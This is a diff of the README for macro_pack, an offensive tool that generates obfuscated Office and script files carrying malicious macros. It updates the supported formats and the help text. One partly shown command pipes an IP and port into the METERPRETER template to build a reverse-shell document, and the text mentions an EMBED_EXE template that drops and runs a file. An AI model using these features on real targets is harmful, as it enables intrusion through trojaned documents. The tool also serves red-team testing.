@@ -19,7 +19,7 @@ This tool is written in Python3 and works on both Linux and Windows platform.
 
 **Note:** Windows platform with the right MS Office applications installed is required for Office documents automatic generation or trojan features.
 
-<p align="center"><img src="./assets/1-2release.png" alt="Demo 1"></p>
+<p align="center"><img src="./assets/embed_calc.png" alt="Demo 1"></p>
 
 ### Obfuscation
 
@@ -55,8 +55,8 @@ Ms Office Supported formats are:
 
 Scripting (txt) supported formats are:  
 * VBA text file (.vba)
-* VBS text file (.vbs)
-* Windows Script Host (.wsh)
+* VBS text file (.vbs).
+* Windows Script File (.wsf)
 * Windows Script Components scriptlets (.wsc, .sct)
 * HTML Applications (.hta)
 
@@ -282,8 +282,9 @@ echo 192.168.0.5 4444 | macro_pack.exe -t METERPRETER -o -G "\\192.168.0.8\c$\us
          
          
     -G, --generate=OUTPUT_FILE_PATH. Generates a file containing the macro. Will guess the format based on extension.
-        Supported extensions are: vba, vbs, hta, doc, docm, xls, xlsm, pptm, vsd, vsdm.
-        Note: Apart from vba which is a text files, all other requires Windows OS with right MS Office application installed.
+        Supported Ms Office extensions are: doc, docm, docx, xls, xlsm, pptm, vsd, vsdm, mpp.
+        Note: Ms Office file generation requires Windows OS with right MS Office application installed.
+        Supported scripts extensions are: vba, vbs, wsf, wsc, sct, hta.
     
     -e, --embed=EMBEDDED_FILE_PATH Will embed the given file in the body of the generated document.
          Use with EMBED_EXE template to auto drop and exec the file.
